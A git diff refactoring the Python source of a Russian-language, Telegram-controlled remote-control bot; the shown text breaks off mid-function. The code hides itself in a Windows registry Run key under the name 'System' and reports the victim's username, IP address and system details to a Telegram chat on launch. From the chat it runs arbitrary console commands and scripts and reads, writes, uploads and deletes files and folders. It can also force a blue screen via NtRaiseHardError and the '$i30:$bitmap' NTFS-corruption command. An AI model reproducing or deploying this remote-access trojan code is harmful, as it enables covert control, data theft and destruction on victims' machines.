@@ -17,7 +17,6 @@ import platform
 import time
 import psutil
 
-from winreg import *
 from telebot import types
 
 config = configparser.ConfigParser()
@@ -56,23 +55,17 @@ def set_autostart_registry(app_name, key_data = None, autostart: bool = True):
         reserved=0,
         access=winreg.KEY_ALL_ACCESS) as key:
         try:
-            if autostart:
-                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
-            
-            else:
-                winreg.DeleteValue(key, app_name)
+            if autostart: winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
+            else: winreg.DeleteValue(key, app_name)
         
-        except OSError:
-            return False
-        
+        except OSError: return False
         return True
 
 set_autostart_registry(app_name='System', key_data=os.path.abspath(__file__))
 
-zapusk = datetime.datetime.now()
-bot.send_message(chat_id, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb), parse_mode="Markdown")
-print(str(zapusk) + "|" + " Управление компом v. 3.0 успешно запущено!")
-        
+startup_time = datetime.datetime.now()
+bot.send_message(chat_id, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb), parse_mode="Markdown")
+print(f"{startup_time} | Управление компом v. 3.1 успешно запущено!")
 
 
 @bot.message_handler(commands=['start'])
@@ -82,65 +75,48 @@ def start(message):
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         return mainmenu(message)
 
-
-def samp_connect(message):
+def mainmenu(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if  message.text.strip() == '/start':
-            return start()
-
-        elif  message.text.strip() == 'Назад':
-            return samp_menu(message)
-
-        try:
-            bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ message.text.strip()}*...', parse_mode = "Markdown")
-            samp_menu(message)
-            return subprocess.Popen(f'{samp_route}\samp.exe {message.text.strip()}', shell=True)
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("/start")
+        item1=types.KeyboardButton("Консоль")
+        item2=types.KeyboardButton("Настройки ПК")
+        item3=types.KeyboardButton("Файлы и папки")
+        item4=types.KeyboardButton("Клавиши")
+        item5=types.KeyboardButton("Троллинг")
+        item6=types.KeyboardButton("SAMP функции")
+        item7=types.KeyboardButton("Меню биндов")
+        item8=types.KeyboardButton("Особые функции")
+        markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8)
         
-        except:
-            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
-            return samp_menu(message)
+        bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
+        return bot.register_next_step_handler(message, check_main)
 
-
-
-def raklite_connect(message):
+def check_main(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        try:
-            if message.text.strip() == '/start':
-                return start(message)
+        if message.text.strip() == '/start': return start(message)
+        if message.text.strip() == 'Файлы и папки': return files_menu(message)
+        elif message.text.strip() == 'Консоль': return console_menu(message)
+        elif message.text.strip() == 'Клавиши': return keyboard_menu(message)
+        elif message.text.strip() == 'Меню биндов': return bind_menu(message)
+        elif message.text.strip() == 'Троллинг': return packs(message)
+        elif message.text.strip() == 'Особые функции': return other_functions(message)
+        elif message.text.strip() == 'SAMP функции': return samp_menu(message)
+        elif message.text.strip() == 'Настройки ПК': return pc_settings(message)
 
-            if message.text.strip() == 'Назад':
-                return samp_menu(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+        return mainmenu(message)
 
-            info = message.text.strip().split(',') # ник,ip,port
-
-            if len(info) != 3:
-                bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
-                return samp_menu(message)
-
-            bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
-            samp_menu(message)
-            return subprocess.Popen(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
-
-        except:
-            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
-            return samp_menu(message)
-
-
-
-def powershell_cmd(message):
+def console_commands(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-
-        if message.text.strip() == 'Назад':
-            return console_menu(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
+        if message.text.strip() == 'Назад': return console_menu(message)
+        elif message.text.strip() == '/start': return start(message)
 
         else:
             try:
@@ -160,24 +136,21 @@ def powershell_cmd(message):
                     my_file.close()
                     bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                     os.remove('C:\\temp\\ConsoleOutput.txt')
-                    return bot.register_next_step_handler(message, powershell_cmd)
+                    return bot.register_next_step_handler(message, console_commands)
 
                 bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
                 bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли выше', parse_mode = "Markdown")
-                return bot.register_next_step_handler(message, powershell_cmd)
+                return bot.register_next_step_handler(message, console_commands)
 
             except:
                 bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли оказался *пустой строкой*!', parse_mode = "Markdown")
-                return bot.register_next_step_handler(message, powershell_cmd)
+                return bot.register_next_step_handler(message, console_commands)
 
 
 
 def python_scripts(message):
-    if message.text.strip() == '/start':
-        return start(message)
-
-    elif message.text.strip() == 'Назад':
-        return console_menu(message)
+    if message.text.strip() == '/start': return start(message)
+    elif message.text.strip() == 'Назад': return console_menu(message)
     
     bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был запущен!*', parse_mode = "Markdown")
     console_menu(message)
@@ -188,26 +161,26 @@ def python_scripts(message):
         bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был успешно выполнен!\nЛог ниже*', parse_mode = "Markdown")
         return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
 
-    except:
-        return bot.send_message(message.chat.id, f'❌ *Python скрипт по пути {message.text.strip()} не был запущен из-за ошибки!*', parse_mode = "Markdown")
+    except: return bot.send_message(message.chat.id, f'❌ *Python скрипт по пути {message.text.strip()} не был запущен из-за ошибки!*', parse_mode = "Markdown")
 
 
 
 def bsod(message):
-    if message.text.strip() == 'Да, конечно':
-        bot.send_message(message.chat.id, f'☑️ *Вы успешно вызвали BSOD!*', parse_mode = "Markdown")
-        subprocess.call("cd C:\:$i30:$bitmap", shell=True)
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        return ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+    get_chat_id = message.chat.id
 
-    elif message.text.strip() == '/start':
-        return start(message)
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip() == '/start': return start(message)
 
-    elif message.text.strip() == 'Нет, я передумал':
-        bot.send_message(message.chat.id, f'☑️ *Вы успешно отменили BSOD!*', parse_mode = "Markdown")
-        return other_functions(message)
+        elif message.text.strip() == 'Да, конечно':
+            bot.send_message(message.chat.id, f'☑️ *Вы успешно вызвали BSOD!*', parse_mode = "Markdown")
+            subprocess.call("cd C:\:$i30:$bitmap", shell=True)
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+            return ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+        
+        elif message.text.strip() == 'Нет, я передумал':
+            bot.send_message(message.chat.id, f'☑️ *Вы успешно отменили BSOD!*', parse_mode = "Markdown")
+            return other_functions(message)
 
-    else:
         bot.send_message(message.chat.id, '❌ Ошибка: *неизвестный ответ*!', parse_mode="Markdown")
         return other_functions(message)
 
@@ -217,11 +190,8 @@ def sozd_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return files(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return files_menu(message)
         
         else:
             try:
@@ -232,21 +202,20 @@ def sozd_file(message):
 
             except:
                 bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
-                return files(message)
+                return files_menu(message)
 
 def sozd_file2(message, route):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):        
-        if message.text.strip() == '/start':
-            return start(message)
+        if message.text.strip() == '/start': return start(message)
 
         else:
             my_file = open(str(route), "a+", encoding='utf-8')
             my_file.write(message.text.strip())
             my_file.close()
             bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан!', parse_mode="Markdown")
-            return files(message)
+            return files_menu(message)
 
 
 
@@ -262,34 +231,24 @@ def change_file(message):
         markup.add(item0, item1, item2, item3)
 
         bot.send_message(message.chat.id, '*✍️ Выберите действие!*', reply_markup=markup, parse_mode="Markdown")
-        return bot.register_next_step_handler(message, change_file1)
+        return bot.register_next_step_handler(message, change_file_check)
     
-def change_file1(message):
+def change_file_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Назад':
-            return files(message)
+        if message.text.strip() == 'Назад': return files_menu(message)
+        elif message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == "Добавить содержимое": return add_in_file_content(message)
+        elif message.text.strip() == "Очистить файл": return clean_file(message)
+        elif message.text.strip() == "Полностью изменить содержимое": return change_file(message)
 
-        elif message.text.strip() == "Добавить содержимое":
-            return dobvka_file(message)
-
-        elif message.text.strip() == "Очистить файл":
-            return ochistka(message)
-
-        elif message.text.strip() == "Полностью изменить содержимое":
-            return izmena(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор!* Повторите попытку', parse_mode="Markdown")
-            return change_file(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор!* Повторите попытку', parse_mode="Markdown")
+        return change_file(message)
 
 
 
-def izmena(message):
+def change_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -298,35 +257,29 @@ def izmena(message):
         markup.add(item0)
 
         bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
-        return bot.register_next_step_handler(message, izmena_2)
+        return bot.register_next_step_handler(message, change_file_new_content)
 
-def izmena_2(message):
+def change_file_new_content(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return change_file(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return change_file(message)
 
         else:
             bot.send_message(message.chat.id, '✍️ *Укажите новое содержимое!*', parse_mode="Markdown")
-            return bot.register_next_step_handler(message, izmena_3, message.text.strip())
+            return bot.register_next_step_handler(message, change_file_finish, message.text.strip())
 
-def izmena_3(message, route):
+def change_file_finish(message, route):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         try:
-            if message.text.strip() == '/start':
-                return start(message)
-
-            elif message.text.strip() == 'Назад':
-                return change_file(message)
+            if message.text.strip() == '/start': return start(message)
+            elif message.text.strip() == 'Назад': return change_file(message)
 
             else:
-                f = open(str(route),'w',encoding = 'utf-8')
+                f = open(route,'w',encoding = 'utf-8')
                 f.write(message.text.strip())
                 f.close()
                 bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно изменен!', parse_mode="Markdown")
@@ -338,7 +291,7 @@ def izmena_3(message, route):
 
 
 
-def ochistka(message):
+def clean_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -347,35 +300,30 @@ def ochistka(message):
         markup.add(item0)
 
         bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
-        return bot.register_next_step_handler(message, check_ochistka)
+        return bot.register_next_step_handler(message, clean_file_check)
 
-def check_ochistka(message):
+def clean_file_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         route = message.text.strip()
-        
-        if route == '/start':
-            return start(message)
+        if route == '/start': return start(message)
+        elif route == 'Назад': return change_file(message)
 
-        elif route == 'Назад':
+        try:
+            f = open(route,'w+',encoding = 'utf-8')
+            f.write("")
+            f.close
+            bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно очищен!', parse_mode='Markdown')
+            return mainmenu(message)
+
+        except:
+            bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует*', parse_mode='Markdown')
             return change_file(message)
 
-        else:
-            try:
-                f = open(route,'w+',encoding = 'utf-8')
-                f.write("")
-                f.close
-                bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно очищен!', parse_mode='Markdown')
-                return mainmenu(message)
-
-            except:
-                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует*', parse_mode='Markdown')
-                return change_file(message)
 
 
-
-def dobvka_file(message):
+def add_in_file_content(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -383,41 +331,35 @@ def dobvka_file(message):
         item0=types.KeyboardButton("Назад")
         markup.add(item0)
         bot.send_message(message.chat.id, '✍️ *Введите название файла с расширением или путь до нужного файла*', parse_mode='Markdown', reply_markup=markup)
-        return bot.register_next_step_handler(message, dobavka_put)
+        return bot.register_next_step_handler(message, add_in_file_text)
 
-def dobavka_put(message):
+def add_in_file_text(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад':return change_file(message)
 
-        elif message.text.strip() == 'Назад':
-            return change_file(message)
+        bot.send_message(message.chat.id, '✍️ *Укажите, что нужно добавить!*', parse_mode='Markdown')
+        return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())
 
-        else:
-            bot.send_message(message.chat.id, '✍️ *Укажите, что нужно добавить!*', parse_mode='Markdown')
-            return bot.register_next_step_handler(message, dobavka_final, message.text.strip())
-
-def dobavka_final(message, route):
+def add_in_file_finish(message, route):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
+        content = message.text.strip()
 
-        elif message.text.strip() == 'Назад':
+        if content == '/start': return start(message)
+        elif content == 'Назад':
             return change_file(message)
 
         else:
             try:
-                sod = message.text.strip()
-
-                my_file = open(str(route), "a+")
-                my_file.write(str(sod))
+                my_file = open(route, "a+")
+                my_file.write(content)
                 my_file.close()
                 bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан/изменен!', parse_mode='Markdown')
-                return files(message)
+                return files_menu(message)
 
             except:
                 bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует!*', parse_mode='Markdown')
@@ -425,7 +367,7 @@ def dobavka_final(message, route):
 
 
 
-def delete_file5545(message):
+def delete_menu(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -436,31 +378,24 @@ def delete_file5545(message):
         markup.add(item0, item1, item2)
 
         bot.send_message(message.chat.id, '✍️ *Выберите то, что необходимо*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, check_delete)
+        return bot.register_next_step_handler(message, check_delete_menu)
 
-def check_delete(message):
+def check_delete_menu(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Удалить папку':
-            return delete_papka(message)
-
-        elif message.text.strip() == 'Удалить файл':
-            return delete_filee(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return files(message)
-
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return files_menu(message)
+        elif message.text.strip() == 'Удалить папку': return delete_folder(message)
+        elif message.text.strip() == 'Удалить файл': return delete_file(message)
+        
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
-            return delete_file5545(message)
+            return delete_menu(message)
 
 
 
-def delete_filee(message):
+def delete_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -469,31 +404,26 @@ def delete_filee(message):
         markup.add(item0)
 
         bot.send_message(message.chat.id, '*✍️ Введите путь к файлу, который надо удалить (либо просто название файла с расширением, если он в текущей папке)!*', parse_mode='Markdown', reply_markup=markup)
-        return bot.register_next_step_handler(message, delete_filee1)
+        return bot.register_next_step_handler(message, delete_file_check)
 
-def delete_filee1(message):
+def delete_file_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        try:
-            if message.text.strip() == '/start':
-                return start(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return delete_menu(message)
 
-            elif message.text.strip() == 'Назад':
-                return delete_file5545(message)
-
-            else:
-                os.remove(message.text.strip())
-                bot.send_message(message.chat.id, f'☑️ Файл по пути *{message.text.strip()}* был успешно удален!', parse_mode = "Markdown")
-                return delete_file5545(message)
-
+        try: os.remove(message.text.strip())
         except:
             bot.send_message(message.chat.id, '❌ Ошибка: *файл не был найден или отсутствует доступ!*\nПовторите попытку позже', parse_mode='Markdown')
-            return delete_file5545(message)
+            return delete_menu(message)
+            
+        bot.send_message(message.chat.id, f'☑️ Файл по пути *{message.text.strip()}* был успешно удален!', parse_mode = "Markdown")
+        return delete_menu(message)
 
 
 
-def delete_papka(message):
+def delete_folder(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -502,33 +432,27 @@ def delete_papka(message):
         markup.add(item0)
 
         bot.send_message(message.chat.id, '*✍️ Введите путь к папке, которую надо удалить!*', parse_mode='Markdown', reply_markup=markup)
-        return bot.register_next_step_handler(message, delete_papka1)
+        return bot.register_next_step_handler(message, delete_folder_check)
 
-def delete_papka1(message):
+def delete_folder_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        try:
-            if message.text.strip() == '/start':
-                return start(message)
-
-            elif message.text.strip() == 'Назад':
-                return delete_file5545(message)
-            
-            else:
-                putt = message.text.strip()
-                shutil.rmtree(putt)
-
-                bot.send_message(message.chat.id, f'☑️ Папка по пути *{putt}* была удалена!', parse_mode = "Markdown")
-                return delete_file5545(message)
+        route = message.text.strip()
+        if route == '/start': return start(message)
+        elif route == 'Назад': return delete_menu(message)
         
+        try: shutil.rmtree(route)
         except:
             bot.send_message(message.chat.id, '❌ Ошибка: *папка не была найдена или к ней отсутствует доступ!*\nПовторите попытку', parse_mode='Markdown')
-            return delete_file5545(message)
+            return delete_menu(message)
+
+        bot.send_message(message.chat.id, f'☑️ Папка по пути *{route}* была удалена!', parse_mode = "Markdown")
+        return delete_menu(message)
 
 
 
-def download_on_pc1(message):
+def download_on_pc_menu(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -545,7 +469,10 @@ def check_download_on_pc(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Выгрузить фото':
+        if message.text.strip() == 'Назад': return files_menu(message)
+        elif message.text.strip() == '/start': return start(message)
+
+        elif message.text.strip() == 'Выгрузить фото':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("Назад")
             markup.add(item0)
@@ -560,30 +487,17 @@ def check_download_on_pc(message):
 
             bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженный файл\n(Пример: C:\\pon.txt)*', parse_mode="Markdown", reply_markup=markup)
             return bot.register_next_step_handler(message, download_file_on_pc)
-
-        elif message.text.strip() == 'Назад':
-            return files(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
-            return download_on_pc1(message)
-
-
-
+        
+        bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
+        return download_on_pc_menu(message)
 
 
 def download_file_on_pc(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return download_file_on_pc1(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return download_file_on_pc1(message)
 
         bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
         return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())
@@ -595,53 +509,45 @@ def download_file_on_pc1(message, route):
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         try:
-            with open(route, 'wb') as new_file:
-                new_file.write(downloaded_file)
+            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
 
             bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
-            return download_on_pc1(message)
+            return download_on_pc_menu(message)
 
         except:
             bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
-            return download_on_pc1(message)
-
-
-
+            return download_on_pc_menu(message)
 
 
 def download_photo(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return download_file_on_pc1(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return download_file_on_pc1(message)
 
         bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
-        return bot.register_next_step_handler(message, download_photo1, message.text.strip())
+        return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())
 
-def download_photo1(message, route):
+def download_photo_on_pc(message, route):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         try:
-            with open(route, 'wb') as new_file:
-                new_file.write(downloaded_file)
+            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
 
             bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
-            return download_on_pc1(message)
+            return download_on_pc_menu(message)
 
         except:
             bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
-            return download_on_pc1(message)
+            return download_on_pc_menu(message)
 
 
 
-def files(message):
+def files_menu(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -655,13 +561,15 @@ def files(message):
         item6=types.KeyboardButton("Назад")
         markup.add(item0, item1, item2, item3, item4, item5, item6)
         bot.send_message(message.chat.id, '*🗂 Вы в меню файлов!*', reply_markup=markup, parse_mode="Markdown")
-        return bot.register_next_step_handler(message, check_files)
+        return bot.register_next_step_handler(message, files_menu_check)
 
-def check_files(message):
+def files_menu_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):  
-        if message.text.strip() == 'Создание файлов/папок':
+        if message.text.strip() == '/start': return start(message)
+
+        elif message.text.strip() == 'Создание файлов/папок':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("Создать файл")
             item1=types.KeyboardButton("Создать папку")
@@ -671,17 +579,10 @@ def check_files(message):
             bot.send_message(message.chat.id, '*✍️ Выберите то, что необходимо создать или вернитесь назад!*', reply_markup=markup, parse_mode="Markdown")
             return bot.register_next_step_handler(message, check_create)
 
-        elif message.text.strip() == 'Изменение файлов': 
-            return change_file(message)
-
-        elif message.text.strip() == 'Назад':
-            return mainmenu(message)
-
-        elif message.text.strip() == 'Удаление файлов/папок':
-            return delete_file5545(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
+        elif message.text.strip() == 'Изменение файлов':  return change_file(message)
+        elif message.text.strip() == 'Назад': return mainmenu(message)
+        elif message.text.strip() == 'Удаление файлов/папок': return delete_menu(message)
+        elif message.text.strip() == 'Выгрузить файл на ПК': return download_on_pc_menu(message)
 
         elif message.text.strip() == 'Запустить файл/программу':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
@@ -699,18 +600,17 @@ def check_files(message):
             bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt), если файл не из этой папки, введите полный путь (до 50 мб)*', reply_markup=markup, parse_mode="Markdown")
             return bot.register_next_step_handler(message, download_file)
 
-        elif message.text.strip() == 'Выгрузить файл на ПК':
-            return download_on_pc1(message)
-
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode='Markdown')
-            return files(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode='Markdown')
+        return files_menu(message)
 
 
 def check_create(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip() == 'Назад': return files_menu(message)
+        elif message.text.strip() == '/start': return start(message)
+    
         if message.text.strip() == 'Создать файл':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("Назад")
@@ -727,34 +627,24 @@ def check_create(message):
             bot.send_message(message.chat.id, '*✍️ Введите путь к новой папке или просто введите ее название, если хотите ее создать в месте, где запущен скрипт\n\n❗️ Пример пути: C:\\Новая папка*', parse_mode="Markdown", reply_markup=markup)
             return bot.register_next_step_handler(message, create_folder)
 
-        elif message.text.strip() == 'Назад':
-            return files(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode="Markdown")
-            return files(message)
+            return files_menu(message)
 
 def create_folder(message):
     try:
         route = message.text.strip()
+        if route == '/start': return start(message)
+        elif route == 'Назад': return files_menu(message)
 
-        if route == '/start':
-            return start(message)
-
-        elif route == 'Назад':
-            return files(message)
-
-        os.mkdir(str(route))
+        os.mkdir(route)
 
         bot.send_message(message.chat.id, f'*☑️ Папка по пути "{route}" была успешно создана!*', parse_mode="Markdown")
-        return files(message)
+        return files_menu(message)
 
     except:
         bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
-        return files(message)
+        return files_menu(message)
 
 
 
@@ -762,43 +652,35 @@ def download_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        route = message.text.strip()
+        if route == '/start': return start(message)
+        elif route == 'Назад': return files_menu(message)
+
         try:
-            route = message.text.strip()
-            
-            if route == '/start':
-                return start(message)
-
-            elif str(route) == 'Назад':
-                return files(message)
-
-            file = open(str(route), 'rb')
+            file = open(route, 'rb')
             bot.send_document(message.chat.id, file)
-            return files(message)
-
+            return files_menu(message)
         except:
             bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует*', parse_mode='Markdown')
-            return files(message)
+            return files_menu(message)
+        
 
 
 def open_file(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        try:
-            if message.text.strip() == "/start":
-                return start(message)
-
